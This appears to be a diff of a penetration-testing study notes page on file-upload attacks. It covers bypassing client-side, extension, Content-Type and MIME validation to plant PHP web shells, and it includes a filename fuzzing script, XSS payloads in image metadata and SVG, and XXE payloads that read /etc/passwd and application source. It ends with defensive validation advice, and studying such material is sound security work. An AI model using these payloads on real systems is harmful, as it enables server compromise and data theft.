-<div class="mdbook-callouts mdbook-callouts-tip">
-<p class="mdbook-callouts-title">
-  <span class="mdbook-callouts-icon"></span>
-  tip
-</p>
-<p>You can generate reverse shell scripts for several languages. You can use many reverse shell payloads with the <code>-p</code> flag and specify the output language with the <code>-f</code> flag.</p>
-</div>
+<blockquote>
+<p>[!TIP]
+You can generate reverse shell scripts for several languages. You can use many reverse shell payloads with the <code>-p</code> flag and specify the output language with the <code>-f</code> flag.</p>
+</blockquote>
 <h2 id="client-side-validation"><a class="header" href="#client-side-validation">Client-Side Validation</a></h2>
 <p>Many web apps only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format.</p>
 <p>However, as the file format validation is happening on the client-side, you can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. You may also modify the front-end code through your browser's dev tools to disable any validation in place.</p>
 <p>This time, when trying to upload a file, you cannot see your PHP scripts, as the dialog appears to be limited to image formats only.</p>
 <p><img src="../../../../images/file_upload4.png" alt="limited" /></p>
-<p>You may still select the <code>All Files</code> option to select your PHP script anyway, but when you do so, you get an error message saying "Only images are allowed!", and the "Upload" button gets disabled.</p>
+<p>You may still select the <code>All Files</code> option to select your PHP script anyway, but when you do so, you get an error message saying &quot;Only images are allowed!&quot;, and the &quot;Upload&quot; button gets disabled.</p>
 <p>This indicates some form of file type validation, so you cannot just upload a web shell through the upload form, as you did before. Luckily, all validation appears to be happening on the front-end, as the page never refreshes or sends any HTTP requests after selecting your file. So, you should be able to have complete control over these client-side validations.</p>
 <p>Any code that runs on the client-side is under your control. While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within your browser. If the web app does not apply any of these validations on the back-end, you should be able to upload any file type.</p>
 <h3 id="back-end-request-modification"><a class="header" href="#back-end-request-modification">Back-End Request Modification</a></h3>
@@ -567,16 +255,16 @@ Payload size: 3033 bytes
 <h3 id="disabling-front-end-validation"><a class="header" href="#disabling-front-end-validation">Disabling Front-End Validation</a></h3>
 <p>Another method to bypass client-side validations is through manipulating the front-end code. As these functions are being completely processed within your web browser, you have complete control over them. So, you can modify these scripts or disable them entirely. Then, you may use the upload functionality to upload any file type without needing to utilize Burp to capture and modify your requests.</p>
 <p>To start, you can open the browser's Page Inspector, and then click on the profile image, which is where you trigger the file selector for upload form.</p>
-<pre><code class="language-html">&lt;input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png"&gt;
+<pre><code class="language-html">&lt;input type=&quot;file&quot; name=&quot;uploadFile&quot; id=&quot;uploadFile&quot; onchange=&quot;checkFile(this)&quot; accept=&quot;.jpg,.jpeg,.png&quot;&gt;
 </code></pre>
 <p>You see that the file input specifies (<code>.jpg</code>, <code>.jpeg</code>, <code>.png</code>) as the allowed file types within the file selection dialog. However, you can easily modify this and select <code>All Files</code> as you did before, so it is unnecessary to change this part of the page.</p>
-<p>The more interesting part is <code>onchange="checkFile(this)"</code>, which appears to run a JavaScript code whenever you select a file, which appears to be doing the file type validation. To get the details of this function, you can go to the browser's console, and then you can type the function's name to get its details.</p>
+<p>The more interesting part is <code>onchange=&quot;checkFile(this)&quot;</code>, which appears to run a JavaScript code whenever you select a file, which appears to be doing the file type validation. To get the details of this function, you can go to the browser's console, and then you can type the function's name to get its details.</p>
 <pre><code class="language-javascript">function checkFile(File) {
 ...SNIP...
     if (extension !== 'jpg' &amp;&amp; extension !== 'jpeg' &amp;&amp; extension !== 'png') {
-        $('#error_message').text("Only images are allowed!");
+        $('#error_message').text(&quot;Only images are allowed!&quot;);
         File.form.reset();
-        $("#submit").attr("disabled", true);
+        $(&quot;#submit&quot;).attr(&quot;disabled&quot;, true);
     ...SNIP...
     }
 }
@@ -585,7 +273,7 @@ Payload size: 3033 bytes
 <p>To do so, you can go back to your inspector, click on the profile image again, double-click on the function name, and delete it.</p>
 <p>With the <code>checkFile</code> function removed from the file input, you should be able to select your PHP web shell through the file selection dialog and upload it normally with no validations.</p>
 <p>Once you upload your web shell, you can use the Page Inspector once more, click on the profile image, and you should see the URL of your uploaded web shell.</p>
-<pre><code class="language-html">&lt;img src="/profile_images/shell.php" class="profile-image" id="profile-image"&gt;
+<pre><code class="language-html">&lt;img src=&quot;/profile_images/shell.php&quot; class=&quot;profile-image&quot; id=&quot;profile-image&quot;&gt;
 </code></pre>
 <h2 id="blacklist-filters"><a class="header" href="#blacklist-filters">Blacklist Filters</a></h2>
 <h3 id="blacklisting-extensions"><a class="header" href="#blacklisting-extensions">Blacklisting Extensions</a></h3>
@@ -596,12 +284,12 @@ Payload size: 3033 bytes
 <li>Testing against a whitelist of types</li>
 </ul>
 <p>Furthermore, the validation may also check the file type or the file content for type matching. The weakest form of validation amongst these is testing the file extension against a blacklist of extension to determine whether the upload request should be blocked. For example, the following pieve of code checks if the uploaded file extension is PHP and drops the request if it is:</p>
-<pre><code class="language-php">$fileName = basename($_FILES["uploadFile"]["name"]);
+<pre><code class="language-php">$fileName = basename($_FILES[&quot;uploadFile&quot;][&quot;name&quot;]);
 $extension = pathinfo($fileName, PATHINFO_EXTENSION);
 $blacklist = array('php', 'php7', 'phps');
 
 if (in_array($extension, $blacklist)) {
-    echo "File type not allowed";
+    echo &quot;File type not allowed&quot;;
     die();
 }
 </code></pre>
@@ -612,22 +300,19 @@ if (in_array($extension, $blacklist)) {
 <p>You should keep the file content for this attack, as you are only interested in fuzzing file extensions. You can use this <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">list</a> to test for possible php extensions.</p>
 <p><img src="../../../../images/file_upload8.png" alt="success" /></p>
 <p>You can sort the result by length, and you will see that all requests with the Content-Length of 193 passed the extension validation, as they all responded with <code>File successfully uploaded</code>. In contrast, the rest responded with an error message saying <code>Extension not allowed</code>.</p>
-<div class="mdbook-callouts mdbook-callouts-note">
-<p class="mdbook-callouts-title">
-  <span class="mdbook-callouts-icon"></span>
-  note
-</p>
-<p>Now, you can try uploading a file using any of the allowed extensions, and some of them may allow you to execute PHP code. Not all extensions will work with all web server configurations, so you may need to try several extensions to get one that successfully executes PHP code.</p>
-</div>
+<blockquote>
+<p>[!NOTE]
+Now, you can try uploading a file using any of the allowed extensions, and some of them may allow you to execute PHP code. Not all extensions will work with all web server configurations, so you may need to try several extensions to get one that successfully executes PHP code.</p>
+</blockquote>
 <h2 id="whitelist-filters"><a class="header" href="#whitelist-filters">Whitelist Filters</a></h2>
 <h3 id="whitelisting-extensions"><a class="header" href="#whitelisting-extensions">Whitelisting Extensions</a></h3>
 <p>If you try the same approach you did before, you will now get <code>Only Images are allowed</code>, which may be more common in web apps than seeing a blocked extension type. However, error messages do not always reflect which form of validation is being utilized.</p>
 <p><img src="../../../../images/file_upload9.png" alt="only images" /></p>
 <p>All variations of PHP extensions are blocked. However, the wordlist you used also contained other 'malicious' extensions that were not blocked and were successfully uploaded.</p>
-<pre><code class="language-php">$fileName = basename($_FILES["uploadFile"]["name"]);
+<pre><code class="language-php">$fileName = basename($_FILES[&quot;uploadFile&quot;][&quot;name&quot;]);
 
 if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
-    echo "Only images are allowed";
+    echo &quot;Only images are allowed&quot;;
     die();
 }
 </code></pre>
@@ -642,7 +327,7 @@ if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
 <h3 id="reverse-double-extension"><a class="header" href="#reverse-double-extension">Reverse Double Extension</a></h3>
 <p>In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability. For example, an organization may use an open-source web application, which has a file upload functionality. Even if the file upload functionality uses a strict regex pattern that only matches the final extension in the file name, the organization may use the insecure configurations for the web server.</p>
 <p>For example, the <code>/etc/apache2/mods-enabled/php7.4.conf</code> for the Apache2 web server may include the following configuration:</p>
-<pre><code class="language-xml">&lt;FilesMatch ".+\.ph(ar|p|tml)"&gt;
+<pre><code class="language-xml">&lt;FilesMatch &quot;.+\.ph(ar|p|tml)&quot;&gt;
     SetHandler application/x-httpd-php
 &lt;/FilesMatch&gt;
 </code></pre>
@@ -667,10 +352,10 @@ if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
 <p>A little script to generate all permutations:</p>
 <pre><code class="language-bash">for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
     for ext in '.php' '.phps'; do
-        echo "shell$char$ext.jpg" &gt;&gt; wordlist.txt
-        echo "shell$ext$char.jpg" &gt;&gt; wordlist.txt
-        echo "shell.jpg$char$ext" &gt;&gt; wordlist.txt
-        echo "shell.jpg$ext$char" &gt;&gt; wordlist.txt
+        echo &quot;shell$char$ext.jpg&quot; &gt;&gt; wordlist.txt
+        echo &quot;shell$ext$char.jpg&quot; &gt;&gt; wordlist.txt
+        echo &quot;shell.jpg$char$ext&quot; &gt;&gt; wordlist.txt
+        echo &quot;shell.jpg$ext$char&quot; &gt;&gt; wordlist.txt
     done
 done
 </code></pre>
@@ -683,7 +368,7 @@ done
 <pre><code class="language-php">$type = $_FILES['uploadFile']['type'];
 
 if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
-    echo "Only images are allowed";
+    echo &quot;Only images are allowed&quot;;
     die();
 }
 </code></pre>
@@ -691,22 +376,19 @@ if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))
 <p>You may start by fuzzing the Content-Type header with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt">Content-Type Wordlist</a> through Burp Intruder, to see which types are allowed. However, the message tells you that only images are allowed, so you can limit your scan to image types, which reduces the wordlist to 45 types only.</p>
 <p><img src="../../../../images/file_upload13.png" alt="content type" /></p>
 <p>Now you get a <code>File successfully uploaded</code>.</p>
-<div class="mdbook-callouts mdbook-callouts-note">
-<p class="mdbook-callouts-title">
-  <span class="mdbook-callouts-icon"></span>
-  note
-</p>
-<p>A file upload HTTP request has two Content-Type headers, one for the attached file (<em>at the bottom</em>), and one for the full request (<em>at the top</em>). You usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header, in which case you will need to modify the main Content-Type header.</p>
-</div>
+<blockquote>
+<p>[!NOTE]
+A file upload HTTP request has two Content-Type headers, one for the attached file (<em>at the bottom</em>), and one for the full request (<em>at the top</em>). You usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header, in which case you will need to modify the main Content-Type header.</p>
+</blockquote>
 <h3 id="mime-type"><a class="header" href="#mime-type">MIME-Type</a></h3>
 <p><em>Multipurpose Internet Mail Extensions (MIME)</em> is an internet standard that determines the type of a file through its general format and bytes structure.</p>
 <p>This is usually done by inspecting the first few bytes of the file's content, which contain the File Signature or Magic Bytes. For example, if a file starts with <code>GIF87a</code> this indicates that it is a GIF image, while a file starting with plaintext is usually considered a Text file. If you change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.</p>
 <p>Example:</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ echo "this is a text file" &gt; text.jpg 
+<pre><code class="language-bash">d41y@htb[/htb]$ echo &quot;this is a text file&quot; &gt; text.jpg 
 d41y@htb[/htb]$ file text.jpg 
 text.jpg: ASCII text
 
-d41y@htb[/htb]$ echo "GIF8" &gt; text.jpg 
+d41y@htb[/htb]$ echo &quot;GIF8&quot; &gt; text.jpg 
 d41y@htb[/htb]$file text.jpg
 text.jpg: GIF image data
 </code></pre>
@@ -715,7 +397,7 @@ text.jpg: GIF image data
 <pre><code class="language-php">$type = mime_content_type($_FILES['uploadFile']['tmp_name']);
 
 if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
-    echo "Only images are allowed";
+    echo &quot;Only images are allowed&quot;;
     die();
 }
 </code></pre>
@@ -729,32 +411,32 @@ if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))
 <p>Many file types may allow you to introduce a Stored XSS vulnerability to the web application maliciously crafted versions of them.</p>
 <p>The most basic example is when a web application allows you to upload HTML files. Although HTML files won't allow you to execute code, it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.</p>
 <p>Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web apps, you can include an XSS payload in one of the Metadata parameters that accept raw text, like the <code>Comment</code> or <code>Artist</code>.</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ exiftool -Comment=' "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' HTB.jpg
+<pre><code class="language-bash">d41y@htb[/htb]$ exiftool -Comment=' &quot;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' HTB.jpg
 d41y@htb[/htb]$ exiftool HTB.jpg
 ...SNIP...
-Comment                         :  "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;
+Comment                         :  &quot;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;
 </code></pre>
 <p>You can see that the Comment parameter was updated to your XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if you change the image's MIME-Type to <code>text/html</code>, some web apps may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.</p>
 <p>XSS attacks can also be carried with <code>SVG</code> images, along with several other attacks. Scalable Vector Graphics images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, you can modify their XML data to include an XSS payload.</p>
-<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"&gt;
-    &lt;rect x="1" y="1" width="1" height="1" fill="green" stroke="black" /&gt;
-    &lt;script type="text/javascript"&gt;alert(window.origin);&lt;/script&gt;
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1&quot; height=&quot;1&quot;&gt;
+    &lt;rect x=&quot;1&quot; y=&quot;1&quot; width=&quot;1&quot; height=&quot;1&quot; fill=&quot;green&quot; stroke=&quot;black&quot; /&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;alert(window.origin);&lt;/script&gt;
 &lt;/svg&gt;
 </code></pre>
 <h3 id="xxe"><a class="header" href="#xxe">XXE</a></h3>
 <p>With SVG images, you can also include malicious XML data to leak the source code of the web app, and other internal documents within the server.</p>
 <p>Example to leak <code>/etc/passwd</code>:</p>
-<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
 &lt;svg&gt;&amp;xxe;&lt;/svg&gt;
 </code></pre>
 <p>Once the above SVG image is uploaded and viewed, the XML document would get processed, and you should get the info of <code>/etc/passwd</code> printed on the page or shown in the page source. Similarly, if the web app allows the upload of XML documents, then the same payload can carry the same attack when the XML data is displayed on the web app.</p>
 <p>While reading systems files like <code>/etc/passwd</code> can be very useful for server enumeration, it can have an even more significant benefit for the web penetration testing, as it allows you to read the web application's source files. Access to the source code will enable you to find more vulnerabilities to exploit within the web application through Whitebox Penetration Testing. For File Upload exploitation, it may allow you to locate the upload directory, identify allowed extensions, or find the file naming scheme, which may become handy for further exploitation.</p>
 <p>Example for reading source code in PHP web applications:</p>
-<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt; ]&gt;
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt; ]&gt;
 &lt;svg&gt;&amp;xxe;&lt;/svg&gt;
 </code></pre>
 <p>Once the SVG image is displayed, you should get the base64 encoded content of <code>index.php</code>, which can decode to read the source code.</p>
@@ -779,37 +461,37 @@ Comment                         :  "&gt;&lt;img src=1 onerror=alert(window.origi
 <h3 id="extension-validation"><a class="header" href="#extension-validation">Extension Validation</a></h3>
 <p>While whitelisting extensions is always more secure than blacklisting, it is recommended to use both by whitelisting the allowed extensions and blacklisting dangerous extensions. This way, the blacklist list will prevent uploading malicious scripts if the whitelist is ever bypassed.</p>
 <p>PHP example:</p>
-<pre><code class="language-php">$fileName = basename($_FILES["uploadFile"]["name"]);
+<pre><code class="language-php">$fileName = basename($_FILES[&quot;uploadFile&quot;][&quot;name&quot;]);
 
 // blacklist test
 if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
-    echo "Only images are allowed";
+    echo &quot;Only images are allowed&quot;;
     die();
 }
 
 // whitelist test
 if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
-    echo "Only images are allowed";
+    echo &quot;Only images are allowed&quot;;
     die();
 }
 </code></pre>
 <h3 id="content-validation"><a class="header" href="#content-validation">Content Validation</a></h3>
 <p>You should also validate the file content, since extension validation is not enough. You cannot validate one without the other and must always validate both the file extension and its content. Furthermore, you should always make sure that the file extension matches the file's content.</p>
 <p>PHP example:</p>
-<pre><code class="language-php">$fileName = basename($_FILES["uploadFile"]["name"]);
+<pre><code class="language-php">$fileName = basename($_FILES[&quot;uploadFile&quot;][&quot;name&quot;]);
 $contentType = $_FILES['uploadFile']['type'];
 $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
 
 // whitelist test
 if (!preg_match('/^.*\.png$/', $fileName)) {
-    echo "Only PNG images are allowed";
+    echo &quot;Only PNG images are allowed&quot;;
     die();
 }
 
 // content test
 foreach (array($contentType, $MIMEtype) as $type) {
     if (!in_array($type, array('image/png'))) {
-        echo "Only PNG images are allowed";
+        echo &quot;Only PNG images are allowed&quot;;
         die();
     }
 }
@@ -827,10 +509,10 @@ foreach (array($contentType, $MIMEtype) as $type) {
 <li>limit file size</li>
 <li>update any used libraries</li>
 <li>scan uploaded files for malware or malicious strings</li>
-<li>utilize a WAF as a secondary layer of protection<!-- {% embed footer message="2025 • Created by [d41y](https://github.com/d41y)" %} --></li>
+<li>utilize a WAF as a secondary layer of protection<!-- {% embed footer message="2026 • Created by [d41y](https://github.com/d41y)" %} --></li>
 </ul>
-<div data-embedify data-app="footer" data-option-message="2025 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
-<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2025 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
+<div data-embedify data-app="footer" data-option-message="2026 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
+<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2026 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
@@ -894,7 +576,6 @@ foreach (array($contentType, $MIMEtype) as $type) {
 
         <!-- Custom JS scripts -->
         <script src="../../../../theme/pagetoc.js"></script>
-
 
 
     </div>
